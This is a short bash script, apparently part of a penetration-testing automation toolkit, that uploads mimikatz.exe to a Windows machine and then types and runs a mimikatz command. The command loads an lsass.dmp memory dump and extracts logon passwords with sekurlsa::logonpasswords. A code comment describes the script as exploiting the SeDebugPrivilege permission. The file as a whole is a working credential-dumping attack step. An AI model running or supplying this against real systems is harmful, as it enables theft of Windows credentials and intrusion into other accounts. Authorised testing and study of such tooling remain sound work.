#!/bin/bash

: '
exploit SeDebugPrivilege permission
'

LOCATION="${SCRIPTS_DIR}/windows/mimikatz/.files"
FILE="mimikatz.exe"

ps_webclient_upload_file "${LOCATION}" "${FILE}"

paste_command "${FILE_LOCATION} -Command '"log" "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords"' exit"
xdotool key Return 
